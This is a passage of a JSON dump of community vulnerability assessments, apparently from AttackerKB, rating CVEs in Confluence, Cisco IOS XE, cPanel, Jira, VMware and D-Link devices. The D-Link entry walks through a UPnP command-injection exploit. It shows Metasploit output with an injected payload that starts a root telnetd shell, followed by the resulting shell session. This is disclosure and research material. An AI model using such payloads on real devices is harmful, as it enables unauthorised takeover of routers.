comment](https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64586004) in snakeyaml's issue tracker.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a0d3a601-f94e-437a-acf9-04a918ee0d4c",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "8fe8c305-3ec3-4279-b07b-0f7b7135616f",
      "created": "2023-10-10T12:58:24.39555Z",
      "revisionDate": "2023-10-10T18:36:04.085082Z",
      "document": "Based on our [Rapid7 Analysis](https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515#rapid7-analysis) and having reproduced the vulnerability, the attacker value of this vulnerability is very high, as successful exploitation leads to a total loss of both integrity and confidentiality of all data on the Confluence server. The exploitability rating is also very high as the vulnerability is trivial to exploit, only requiring two simple cURL requests, and it is unauthenticated.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3f1914ef-ad84-464d-95d7-cc61a24003c4",
      "editorId": "74d8ee81-a055-426d-9e7b-21ec15295ca1",
      "topicId": "4d73d1eb-ae94-4697-a673-32d1d66f26d5",
      "created": "2023-10-12T08:23:54.896896Z",
      "revisionDate": "2023-10-12T08:23:54.896467Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "aa1bbfef-b34c-4287-abd0-89dccc2e6c0d",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "33a9d13f-ca57-4d20-a996-0720a40eea42",
      "created": "2023-10-13T11:33:50.193493Z",
      "revisionDate": "2023-10-13T11:35:08.320943Z",
      "document": "This vulnerability is used as part of the ransomware attacks conducted by the Cuba Ransomware group.\r\nOne of the sources of this information is this blog: https://blogs.blackberry.com/en/2023/08/cuba-ransomware-deploys-new-tools-targets-critical-infrastructure-sector-in-the-usa-and-it-integrator-in-latin-america",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "30483785-c799-46e3-af89-f6ba5860660c",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "7c9b2cc2-6f6f-46eb-8484-6906c222908c",
      "created": "2023-10-16T06:53:40.281081Z",
      "revisionDate": "2023-10-16T06:53:40.280717Z",
      "document": "The transition of VMWare Aria Operations for Networks (vRealize Network Insight) from version 6.0 to 6.10 failed to generate new SSH keys for the support and ubuntu users. Consequently, this oversight enabled a malicious actor with SSH access to attain root shell access to the product.\r\n\r\nEvery iteration of VMware's Aria Operations for Networks possesses a distinct SSH key. Crafting a comprehensive exploit necessitated the assembly of these keys from various product versions. It's worth noting that the most recent release, 6.11, remains immune to this problem as VMware had rectified the issue before its launch.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "317dd869-426b-4117-8e0e-502989470b9c",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "46a6ba54-af93-4e2f-9113-6f7086693de3",
      "created": "2023-10-16T08:24:28.540223Z",
      "revisionDate": "2023-10-20T13:56:45.525143Z",
      "document": "This vulnerability is based on an old theme that was discovered in 2013 by `Zach Cutlip` and explained in his blog [The Shadow File](https://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html). It is based on the infamous `UPnP` attack where a command injection vulnerability exists in multiple D-Link network products, allowing an attacker to inject arbitrary command to the `UPnP` via a crafted M-SEARCH packet. \r\nUniversal Plug and Play (UPnP), by default is enabled in most D-Link devices, on the port 1900  and an attacker can perform a remote command execution by injecting the payload into the `Search Target` (ST) field of the SSDP M-SEARCH discover packet.\r\n\r\nWhat triggered my interest is the fact that 10 years after the discovery, this vulnerability still exists and is alive and kicking. Running a Shodan search `title:\"d-link\"` shows around 80.000 D-Link devices from which a considerable amount of devices are still vulnerable. Fortunately, this attack can only performed as a LAN based attack because the `UPnP` discovery service running on port 1900 is typically not exposed to Public Internet.\r\n\r\nBesides the DIR-600 model, multiple other D-Link devices have the same vulnerability. I did some extensive testing with `FirmAE` to simulate and test different D-Link devices and found a comprehensive list of devices that are vulnerable:\r\n* D-Link Router model DIR-300 revisions Ax with firmware v1.06 or older;\r\n* D-Link Router model DIR-300 revisions Bx with firmware v2.15 or older;\r\n* D-Link Router model DIR-600 revisions Bx with firmware v2.18 or older;\r\n* D-Link Router model DIR-645 revisions Ax with firmware v1.05 or older;\r\n* D-Link Router model DIR-815 revisions Bx with firmware v1.04 or older;\r\n* D-Link Router model DIR-816L revisions Bx with firmware v2.06 or older;\r\n* D-Link Router model DIR-817LW revisions Ax with firmware v1.04b01_hotfix or older;\r\n* D-Link Router model DIR-818LW revisions Bx with firmware v2.05b03_Beta08 or older;\r\n* D-Link Router model DIR-822 revisions Bx with firmware v2.03b01 or older;\r\n* D-Link Router model DIR-822 revisions Cx with firmware v3.12b04 or older;\r\n* D-Link Router model DIR-823 revisions Ax with firmware v1.00b06_Beta or older;\r\n* D-Link Router model DIR-860L revisions Ax with firmware v1.12b05 or older;\r\n* D-Link Router model DIR-859 revisions Ax with firmware v1.06b01Beta01 or older;\r\n* D-Link Router model DIR-860L revisions Ax with firmware v1.10b04 or older;\r\n* D-Link Router model DIR-860L revisions Bx with firmware v2.03b03 or older;\r\n* D-Link Router model DIR-865L revisions Ax with firmware v1.07b01 or older;\r\n* D-Link Router model DIR-868L revisions Ax with firmware v1.12b04 or older;\r\n* D-Link Router model DIR-868L revisions Bx with firmware v2.05b02 or older;\r\n* D-Link Router model DIR-869 revisions Ax with firmware v1.03b02Beta02 or older;\r\n* D-Link Router model DIR-880L revisions Ax with firmware v1.08b04 or older;\r\n* D-Link Router model DIR-890L/R revisions Ax with firmware v1.11b01_Beta01 or older;\r\n* D-Link Router model DIR-885L/R revisions Ax with firmware v1.12b05 or older;\r\n* D-Link Router model DIR-895L/R revisions Ax with firmware v1.12b10 or older;\r\n* probably more looking at the scale of impacted devices :-(\r\n\r\nIn `Metasploit`, several modules are available to exploit this vulnerability, but unfortunately they all lack good `check` logic to determine if a D-Link device is vulnerable. Another limitation is that these modules only cover a part of the vulnerable devices during the exploit phase due to the fact that not all architectures are supported (`mipsbe`, `mipsle` and `armle`).\r\n\r\nTo overcome these limitations, I created a new module that has an enhanced `check` method that determines the D-Link device model, firmware information and architecture to determine if the device is vulnerable. Also I extended the exploit part to cover the missing `armle` architecture using the `Linux Dropper` target and I included a `Unix Command` target that leverages the `busybox telnetd` payload.\r\n\r\n### Module in Action\r\n**D-Link DIR-600 emulated target**\r\n```ShellSession\r\n# ./run.sh -d d-link /root/FirmAE/firmwares/DIR600B6_FW215WWb02.bin\r\n[*] /root/FirmAE/firmwares/DIR600B6_FW215WWb02.bin emulation start!!!\r\n[*] extract done!!!\r\n[*] get architecture done!!!\r\nmke2fs 1.47.0 (5-Feb-2023)\r\ne2fsck 1.47.0 (5-Feb-2023)\r\n[*] infer network start!!!\r\n\r\n[IID] 25\r\n[MODE] debug\r\n[+] Network reachable on 192.168.0.1!\r\n[+] Web service on 192.168.0.1\r\n[+] Run debug!\r\nCreating TAP device tap25_0...\r\nSet 'tap25_0' persistent and owned by uid 0\r\nInitializing VLAN...\r\nBringing up TAP device...\r\nStarting emulation of firmware... 192.168.0.1 true true 60.479548271 107.007791943\r\n/root/FirmAE/./debug.py:7: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13\r\n  import telnetlib\r\n[*] firmware - DIR600B6_FW215WWb02\r\n[*] IP - 192.168.0.1\r\n[*] connecting to netcat (192.168.0.1:31337)\r\n[+] netcat connected\r\n------------------------------\r\n|       FirmAE Debugger      |\r\n------------------------------\r\n1. connect to socat\r\n2. connect to shell\r\n3. tcpdump\r\n4. run gdbserver\r\n5. file transfer\r\n6. exit\r\n> 2\r\nTrying 192.168.0.1...\r\nConnected to 192.168.0.1.\r\nEscape character is '^]'.\r\n\r\n/ # uname -a\r\nLinux dlinkrouter 4.1.17+ #28 Sat Oct 31 17:56:39 KST 2020 mips GNU/Linux\r\n/ # hostname\r\ndlinkrouter\r\n/ #\r\n```\r\n**Metasploit module**\r\n```ShellSession\r\nmsf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > options\r\n\r\nModule options (exploit/linux/upnp/dlink_msearch_unauth_lan_rce):\r\n\r\n   Name       Current Setting  Required  Description\r\n   ----       ---------------  --------  -----------\r\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\r\n   RHOSTS     192.168.0.1      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\r\n   RPORT      80               yes       The target port (TCP)\r\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\r\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\r\n   UPNP_PORT  1900             yes       Universal Plug and Play (UPnP) UDP port\r\n   URIPATH                     no        The URI to use for this exploit (default is random)\r\n   URN        urn:device:1     no        Set URN payload\r\n   VHOST                       no        HTTP server virtual host\r\n\r\n\r\n   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:\r\n\r\n   Name     Current Setting  Required  Description\r\n   ----     ---------------  --------  -----------\r\n   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.\r\n   SRVPORT  8080             yes       The local port to listen on.\r\n\r\n\r\nPayload options (cmd/unix/bind_busybox_telnetd):\r\n\r\n   Name       Current Setting  Required  Description\r\n   ----       ---------------  --------  -----------\r\n   LOGIN_CMD  /bin/sh          yes       Command telnetd will execute on connect\r\n   LPORT      4444             yes       The listen port\r\n   RHOST      192.168.0.1      no        The target address\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Unix Command\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > check\r\n\r\n[*] Checking if 192.168.0.1:80 can be exploited.\r\n[*] 192.168.0.1:80 - The target appears to be vulnerable. Product info: DIR-600|2.15|Bx|mipsle\r\nmsf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > exploit\r\n\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Checking if 192.168.0.1:80 can be exploited.\r\n[+] The target appears to be vulnerable. Product info: DIR-600|2.15|Bx|mipsle\r\n[*] Executing Unix Command for cmd/unix/bind_busybox_telnetd\r\n[*] payload: urn:device:1;`telnetd -l /bin/sh -p 4444`\r\n[*] Started bind TCP handler against 192.168.0.1:4444\r\n[*] Command shell session 1 opened (192.168.0.2:41797 -> 192.168.0.1:4444) at 2023-10-16 13:54:53 +0000\r\n\r\n\r\nShell Banner:\r\n_!_\r\n-----\r\n\r\n# uname -a\r\nuname -a\r\nLinux dlinkrouter 4.1.17+ #28 Sat Oct 31 17:56:39 KST 2020 mips GNU/Linux\r\n# hostname\r\nhostname\r\ndlinkrouter\r\n#\r\n```\r\nYou can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/dlink_msearch_unauth_lan_rce.rb) in my local repository or as [PR 18463](https://github.com/rapid7/metasploit-framework/pull/18463) at the Metasploit Github development.\r\n\r\n### Mitigation\r\nYou should update your D-link network devices listed in this article to the latest available firmware.\r\n\r\n### References\r\n[CVE-2023-33625](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33625)\r\n[CVE-2020-15893](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15893)\r\n[CVE-2019\u201320215](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20215)\r\n[D-Link DIR-859: UnAuthenticated RCE in ssdpcgi HTTP_ST](https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-rce-in-ssdpcgi-http-st-cve-2019-20215-en-2e799acb8a73)\r\n[The Shadow File: DLink DIR-815 UPnP Command Injection](https://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html)\r\n[Multiple Vulnerabilities discovered in the D-link Firmware DIR-816L](https://research.loginsoft.com/vulnerability/multiple-vulnerabilities-discovered-in-the-d-link-firmware-dir-816l/)\r\n[D-link DIR-600 cmd injection vulnerability](https://github.com/naihsin/IoT/blob/main/D-Link/DIR-600/cmd%20injection/README.md)\r\n[D-Link UPnP Unauthenticated LAN RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/dlink_msearch_unauth_lan_rce.rb)\r\n[D-Link UPnP Unauthenticated LAN RCE - Metasploit PR 18463](https://github.com/rapid7/metasploit-framework/pull/18463)\r\n[D-Link Firmware Repository](http://legacyfiles.us.dlink.com/)\r\n[FirmAE](https://github.com/pr0v3rbs/FirmAE)\r\n[FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis](https://syssec.kaist.ac.kr/pub/2020/kim_acsac2020.pdf)\r\n\r\n### Credits\r\n* `Zach Cutlip`\r\n* `Michael Messner <devnull@s3cur1ty.de>`\r\n* `Miguel Mendez Z. (s1kr10s)`\r\n* `Pablo Pollanco (secenv)`\r\n* `Naihsin https://github.com/naihsin`\r\n\r\nAnd to all other good fellows who raised this concern ;-)",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a73fb541-da06-4fa5-ab1c-108e27aa789e",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "7c5703d3-9e18-4f5c-a4d2-25e1f09b43cb",
      "created": "2023-10-16T12:18:08.532284Z",
      "revisionDate": "2023-10-16T12:18:08.532627Z",
      "document": "The scarab ransomware operators have been using this vulnerability to compromise victims. More details: https://www.welivesecurity.com/en/eset-research/scarabs-colon-izing-vulnerable-servers/",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "9d8e72d6-32b7-46bd-9eb7-bbf03d22f1f2",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "1d60282e-febb-44a9-9267-ee45f1d583d8",
      "created": "2023-10-16T12:28:10.128501Z",
      "revisionDate": "2024-07-26T19:36:56.229639Z",
      "document": "Observed in attack by our IR team, who we believe is part of the Cl0p ransomware operation.\r\n\r\n[update] \r\nA July 2024 bulletin from multiple U.S. government agencies indicates that North Korean state-sponsored attackers have demonstrated interest in this vulnerability \u2014 not immediately clear whether it was exploited or just used in reconnaissance/target selection: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "5d640fe1-0a4c-4bff-b833-2b23361ee0be",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "972237db-4682-4f2f-b23f-881304a34326",
      "created": "2023-10-17T06:12:59.478288Z",
      "revisionDate": "2023-11-16T08:08:33.009581Z",
      "document": "Cisco has detected ongoing exploitation of an undisclosed vulnerability within the web user interface (UI) component of Cisco IOS XE Software, particularly when it is accessible via the internet or untrusted networks. This vulnerability permits an external, unauthenticated malicious actor to establish an account on a compromised system with full privilege level 15 access. This unauthorized account can subsequently be leveraged to assume control over the compromised system.\r\n\r\nThis vulnerability affects Cisco IOS XE Software if the web UI feature is enabled. The web UI feature is enabled through the ip http server or ip http secure-server commands.\r\n\r\nTo assess whether a system might have been infiltrated, carry out the following verifications:\r\n\r\nExamine the system logs for indications of the following log messages, with \"user\" referring to any entities such as \"cisco_tac_admin,\" \"cisco_support,\" or any locally configured user that remains unfamiliar to the network administrator. Cisco has published more details of possible indicators of compromise in their advisory: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z.\r\n\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "aafdcd41-2c2e-423a-8f6f-819b0b317a01",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "e662d20b-9532-40df-8e2c-df1c335c3437",
      "created": "2023-10-17T07:31:52.320358Z",
      "revisionDate": "2023-10-17T07:31:52.319315Z",
      "document": "A cross-site scripting vulnerability was identified in Cpanel with the ability to be exploited without requiring authentication. Furthermore, the XSS vulnerability remains exploitable, even if the cPanel management ports (2080, 2082, 2083, 2086) are not exposed externally. This implies that if your website is managed through cPanel, it may be vulnerable to cross-site scripting on ports 80 and 443.\r\n\r\nThis vulnerability's allows us to execute arbitrary JavaScript without the need for authentication on nearly all webserver ports when using cPanel in its default configuration. Even on ports 80 and 443, one can access the /cpanelwebcall/ directory since it is being proxied to the cPanel management ports by Apache.\r\nConsequently, an attacker can not only target the cPanel management ports but also the applications running on ports 80 and 443.\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "fecf0e04-e5d0-4edd-b109-73e5e7d07821",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "9fc47966-bdf6-450e-b03f-2e7f74142668",
      "created": "2023-10-18T08:14:02.223518Z",
      "revisionDate": "2023-10-18T08:14:02.223876Z",
      "document": "In Atlassian's October Security Bulletin, this vulnerability was one of the highlighted ones. \r\nIn certain versions of Jira Service Management Server & Data Center, a vulnerability denoted as CVE-2019-13990 was identified. These affected versions contained vulnerable iterations of Terracotta Quartz Scheduler, which could be exploited by authenticated attackers to launch an XML External Entity (XXE) injection attack via job descriptions.\r\n\r\nAtlassian has pledged to issue critical advisories in accordance with the National Vulnerability Database (NVD) vulnerability score. In this instance, the Common Vulnerability Scoring System (CVSS) score for this third-party CVE is critical (9.8). Nevertheless, this score does not always consider the specific context in which the vulnerable component is employed in our software. In this case, unauthenticated attackers who lack local access to the system cannot exploit this vulnerability. Therefore, our internal evaluation of this vulnerability designates it as having a high severity rating.\r\n\r\nAffected Versions:\r\nThis XXE (XML External Entity Injection) vulnerability impacts all versions, including and after 4.20.0, of Jira Service Management Data Center and Server. Versions outside of the support window could potentially be affected, so Atlassian strongly recommends upgrading to the fixed LTS version or a later release.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "7b04bc07-e273-4b2e-8cd6-234a0fda9dfa",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "d682f60f-4477-44e8-9297-508d1e4a93a7",
      "created": "2023-10-19T11:53:42.486599Z",
      "revisionDate": "2024-07-26T12:30:06.444192Z",
      "document": "Microsoft released a blog where they mentioned the abuse of this vulnerability by nation-state sponsored actors.\r\n\r\nUpdate 07/26/2024: CISA released a bulletin on Andariel's activity also mentioning the abuse of this CVE, link: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a ",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
